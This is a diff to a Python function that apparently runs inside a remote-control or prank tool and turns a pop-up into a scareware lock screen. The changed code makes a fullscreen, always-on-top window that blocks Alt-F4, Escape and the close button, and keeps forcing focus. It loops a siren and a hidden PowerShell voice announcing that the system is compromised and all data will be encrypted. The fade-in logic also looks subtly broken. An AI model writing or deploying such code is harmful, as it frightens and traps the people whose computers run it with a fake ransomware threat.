@@ -527,108 +527,137 @@ def main_loop():
                                     import tkinter as tk
                                     root = tk.Tk()
                                     root.title(title)
-                                    
-                                    # Borderless window & transparent start
+
+                                    # Borderless + fullscreen + always on top
                                     root.overrideredirect(True)
+                                    root.attributes('-fullscreen', True)
                                     root.attributes('-topmost', True)
                                     root.attributes('-alpha', 0.0)
-                                    
-                                    # Size and positioning
-                                    window_width = 750
-                                    window_height = 400
+
+                                    # Block all close attempts
+                                    root.protocol("WM_DELETE_WINDOW", lambda: None)
+                                    root.bind("<Alt-F4>", lambda e: "break")
+                                    root.bind("<Escape>", lambda e: "break")
+                                    root.bind("<Control>", lambda e: "break")
+                                    root.bind("<Alt>", lambda e: "break")
+
                                     screen_width = root.winfo_screenwidth()
                                     screen_height = root.winfo_screenheight()
-                                    x = int((screen_width / 2) - (window_width / 2))
-                                    y = int((screen_height / 2) - (window_height / 2))
-                                    
-                                    root.geometry(f"{window_width}x{window_height}+{x}+{y}")
-                                    root.configure(bg="#FF003C") # Neon red outer border
-                                    
-                                    # Inner container (Dark Cyberpunk Theme)
-                                    inner = tk.Frame(root, bg="#0A0A0A")
-                                    inner.pack(fill="both", expand=True, padx=4, pady=4)
-                                    
+
+                                    root.configure(bg="#FF003C")
+
+                                    # Outer glow frame
+                                    outer_glow = tk.Frame(root, bg="#FF003C")
+                                    outer_glow.pack(fill="both", expand=True, padx=6, pady=6)
+
+                                    # Inner container
+                                    inner = tk.Frame(outer_glow, bg="#0A0A0A")
+                                    inner.pack(fill="both", expand=True, padx=2, pady=2)
+
+                                    # Top warning bar
+                                    warn_bar = tk.Frame(inner, bg="#FF003C", height=8)
+                                    warn_bar.pack(fill="x")
+                                    warn_bar.pack_propagate(False)
+
                                     # Blinking Warning Header
-                                    alert_label = tk.Label(inner, text="⚠️ SYSTEM OVERRIDE ⚠️", font=("Consolas", 22, "bold"), bg="#0A0A0A", fg="#FF003C")
-                                    alert_label.pack(pady=(30, 10))
-                                    
+                                    alert_label = tk.Label(inner, text="⚠️ SYSTEM OVERRIDE ⚠️",
+                                                           font=("Consolas", 36, "bold"), bg="#0A0A0A", fg="#FF003C")
+                                    alert_label.pack(pady=(50, 10))
+
                                     def blink_alert():
                                         try:
                                             current_fg = alert_label.cget("fg")
                                             next_fg = "#0A0A0A" if current_fg == "#FF003C" else "#FF003C"
                                             alert_label.config(fg=next_fg)
-                                            root.after(600, blink_alert)
+                                            root.after(300, blink_alert)
                                         except: pass
                                     blink_alert()
-                                    
-                                    # Message Content
-                                    tk.Label(inner, text=title, font=("Consolas", 32, "bold"), bg="#0A0A0A", fg="white", wraplength=650).pack(pady=(10, 15))
-                                    tk.Label(inner, text=message, font=("Consolas", 20), bg="#0A0A0A", fg="#00FF41", wraplength=700).pack(pady=10, expand=True)
-                                    
-                                    # Cool Hover Button
-                                    def on_enter(e): btn.config(bg="#FF003C", fg="white")
-                                    def on_leave(e): btn.config(bg="#1A1A1A", fg="#FF003C")
-                                    
+
+                                    # Title
+                                    tk.Label(inner, text=title, font=("Consolas", 42, "bold"),
+                                             bg="#0A0A0A", fg="white", wraplength=screen_width-100).pack(pady=(20, 15))
+
+                                    # Message with typewriter-style green text
+                                    msg_label = tk.Label(inner, text=message, font=("Consolas", 24),
+                                                         bg="#0A0A0A", fg="#00FF41", wraplength=screen_width-100,
+                                                         justify="center")
+                                    msg_label.pack(pady=15, expand=True)
+
+                                    # Red warning bottom text
+                                    tk.Label(inner, text="DO NOT IGNORE — CRITICAL SYSTEM ALERT",
+                                             font=("Consolas", 14, "bold"), bg="#0A0A0A", fg="#FF003C").pack(pady=(10, 5))
+
                                     is_open = [True]
-                                    
+                                    click_count = [0]
+
                                     def ambulance_siren_loop():
                                         if platform.system() != "Windows": return
                                         try:
                                             import winsound
                                             while is_open[0]:
                                                 if not is_open[0]: break
-                                                winsound.Beep(700, 600) # Low pitch (Do)
+                                                winsound.Beep(700, 400)
                                                 if not is_open[0]: break
-                                                winsound.Beep(900, 600) # High pitch (Re)
+                                                winsound.Beep(900, 400)
                                         except: pass
-                                        
+
                                     def scary_voice_loop():
                                         if platform.system() != "Windows": return
                                         try:
                                             import subprocess
-                                            msg = "Warning. System compromised. Unauthorized access detected. All data will be encrypted."
+                                            msg_text = "Warning. System compromised. Unauthorized access detected. All data will be encrypted."
                                             ps_cmd = (
                                                 'powershell -Command "Add-Type -AssemblyName System.Speech; '
                                                 '$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
-                                                '$synth.Rate = -2; '
-                                                f'$synth.Speak(\'{msg}\')"'
+                                                '$synth.Rate = -3; '
+                                                f'$synth.Speak(\'{msg_text}\')"'
                                             )
                                             while is_open[0]:
                                                 subprocess.run(ps_cmd, shell=True, creationflags=0x08000000)
                                         except: pass
-                                    
+
                                     threading.Thread(target=ambulance_siren_loop, daemon=True).start()
                                     threading.Thread(target=scary_voice_loop, daemon=True).start()
-                                    
+
+                                    def on_enter(e): btn.config(bg="#FF003C", fg="white")
+                                    def on_leave(e): btn.config(bg="#1A1A1A", fg="#FF003C")
+
                                     def close_popup():
-                                        is_open[0] = False
-                                        root.destroy()
-                                    
-                                    btn = tk.Button(inner, text="[ ACKNOWLEDGE ]", command=close_popup, font=("Consolas", 16, "bold"), bg="#1A1A1A", fg="#FF003C", relief="flat", activebackground="#FF003C", activeforeground="white", padx=30, pady=10)
-                                    btn.pack(pady=35)
+                                        click_count[0] += 1
+                                        if click_count[0] >= 3:
+                                            is_open[0] = False
+                                            root.destroy()
+                                        else:
+                                            btn.config(text=f"[ ACKNOWLEDGE ({3-click_count[0]}) ]")
+
+                                    btn = tk.Button(inner, text="[ ACKNOWLEDGE (3) ]", command=close_popup,
+                                                    font=("Consolas", 18, "bold"), bg="#1A1A1A", fg="#FF003C",
+                                                    relief="flat", activebackground="#FF003C", activeforeground="white",
+                                                    padx=40, pady=15)
+                                    btn.pack(pady=40)
                                     btn.bind("<Enter>", on_enter)
                                     btn.bind("<Leave>", on_leave)
-                                    
-                                    # Fade-in Animation
+
+                                    # Fade-in
                                     def fade_in(alpha=0.0):
                                         try:
-                                            alpha += 0.05
+                                            alpha += 0.04
                                             if alpha <= 1.0:
                                                 root.attributes('-alpha', alpha)
-                                                root.after(30, fade_in, alpha)
+                                                root.after(25, fade_in)
                                         except: pass
-                                        
+
                                     def force_focus():
                                         try:
                                             root.lift()
                                             root.attributes('-topmost', True)
                                             root.focus_force()
-                                            root.after(500, force_focus)
+                                            root.after(400, force_focus)
                                         except: pass
-                                        
+
                                     root.after(100, fade_in)
                                     force_focus()
-                                    
+
                                     root.mainloop()
                                 except Exception as e:
                                     # Fallback if tkinter fails
